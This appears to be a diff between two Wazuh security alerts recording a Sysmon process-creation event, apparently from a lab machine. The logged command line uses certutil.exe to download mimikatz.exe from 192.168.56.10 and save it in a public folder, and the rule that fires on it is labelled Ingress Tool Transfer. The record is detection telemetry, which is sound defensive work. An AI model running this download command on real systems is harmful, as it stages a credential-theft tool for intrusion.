@@ -1,5 +1,5 @@
 {
-  "timestamp": "2026-10-29T02:34:23.760+0000",
+  "timestamp": "2026-11-01T02:34:20.327+0000",
   "rule": {
     "level": 12,
     "description": "CertUtil.exe launched with commands to create a binary file",
@@ -15,7 +15,7 @@
         "Ingress Tool Transfer"
       ]
     },
-    "firedtimes": 2,
+    "firedtimes": 5,
     "mail": true,
     "groups": [
       "sysmon",
@@ -31,7 +31,7 @@
   "manager": {
     "name": "Wazuh"
   },
-  "id": "1793241263.2077496",
+  "id": "1793500460.18757741",
   "decoder": {
     "name": "windows_eventchannel"
   },
@@ -46,36 +46,36 @@
         "task": "1",
         "opcode": "0",
         "keywords": "0x8000000000000000",
-        "systemTime": "2026-10-29T02:34:22.3696043Z",
-        "eventRecordID": "48748",
-        "processID": "3252",
-        "threadID": "2240",
+        "systemTime": "2026-11-01T02:34:18.9804873Z",
+        "eventRecordID": "57967",
+        "processID": "3112",
+        "threadID": "3848",
         "channel": "Microsoft-Windows-Sysmon/Operational",
         "computer": "DESKTOP-T0LOHB5",
         "severityValue": "INFORMATION",
-        "message": "\"Process Create:\r\nRuleName: technique_id=T1202,technique_name=Indirect Command Execution\r\nUtcTime: 2026-10-29 02:34:22.357\r\nProcessGuid: {17c2b750-b0ae-6ae2-b303-000000001000}\r\nProcessId: 4856\r\nImage: C:\\Windows\\System32\\certutil.exe\r\nFileVersion: 10.0.19041.5794 (WinBuild.160101.0800)\r\nDescription: CertUtil.exe\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CertUtil.exe\r\nCommandLine: \"C:\\Windows\\system32\\certutil.exe\" -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\\Users\\Public\\m.exe\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-T0LOHB5\\Client\r\nLogonGuid: {17c2b750-96a8-6ae2-d5a1-050000000000}\r\nLogonId: 0x5A1D5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=B98CD5B7D3E427310B5E83F2218E6EA99E12C35E,MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465\r\nParentProcessGuid: {17c2b750-96de-6ae2-1c01-000000001000}\r\nParentProcessId: 9988\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: DESKTOP-T0LOHB5\\Client\""
+        "message": "\"Process Create:\r\nRuleName: technique_id=T1202,technique_name=Indirect Command Execution\r\nUtcTime: 2026-11-01 02:34:18.967\r\nProcessGuid: {17c2b750-a52a-6ae6-9301-000000001200}\r\nProcessId: 7336\r\nImage: C:\\Windows\\System32\\certutil.exe\r\nFileVersion: 10.0.19041.5794 (WinBuild.160101.0800)\r\nDescription: CertUtil.exe\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CertUtil.exe\r\nCommandLine: \"C:\\Windows\\system32\\certutil.exe\" -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\\Users\\Public\\m.exe\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-T0LOHB5\\Client\r\nLogonGuid: {17c2b750-a51d-6ae6-4daf-340000000000}\r\nLogonId: 0x34AF4D\r\nTerminalSessionId: 3\r\nIntegrityLevel: High\r\nHashes: SHA1=B98CD5B7D3E427310B5E83F2218E6EA99E12C35E,MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465\r\nParentProcessGuid: {17c2b750-a527-6ae6-9101-000000001200}\r\nParentProcessId: 6556\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: DESKTOP-T0LOHB5\\Client\""
       },
       "eventdata": {
         "ruleName": "technique_id=T1202,technique_name=Indirect Command Execution",
-        "utcTime": "2026-10-29 02:34:22.357",
-        "processGuid": "{17c2b750-b0ae-6ae2-b303-000000001000}",
-        "processId": "4856",
+        "utcTime": "2026-11-01 02:34:18.967",
+        "processGuid": "{17c2b750-a52a-6ae6-9301-000000001200}",
+        "processId": "7336",
         "image": "C:\\\\Windows\\\\System32\\\\certutil.exe",
         "fileVersion": "10.0.19041.5794 (WinBuild.160101.0800)",
         "description": "CertUtil.exe",
-        "product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "product": "Microsoft® Windows® Operating System",
         "company": "Microsoft Corporation",
         "originalFileName": "CertUtil.exe",
         "commandLine": "\\\"C:\\\\Windows\\\\system32\\\\certutil.exe\\\" -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\\\\Users\\\\Public\\\\m.exe",
         "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
         "user": "DESKTOP-T0LOHB5\\\\Client",
-        "logonGuid": "{17c2b750-96a8-6ae2-d5a1-050000000000}",
-        "logonId": "0x5a1d5",
-        "terminalSessionId": "1",
+        "logonGuid": "{17c2b750-a51d-6ae6-4daf-340000000000}",
+        "logonId": "0x34af4d",
+        "terminalSessionId": "3",
         "integrityLevel": "High",
         "hashes": "SHA1=B98CD5B7D3E427310B5E83F2218E6EA99E12C35E,MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465",
-        "parentProcessGuid": "{17c2b750-96de-6ae2-1c01-000000001000}",
-        "parentProcessId": "9988",
+        "parentProcessGuid": "{17c2b750-a527-6ae6-9101-000000001200}",
+        "parentProcessId": "6556",
         "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
         "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"",
         "parentUser": "DESKTOP-T0LOHB5\\\\Client"
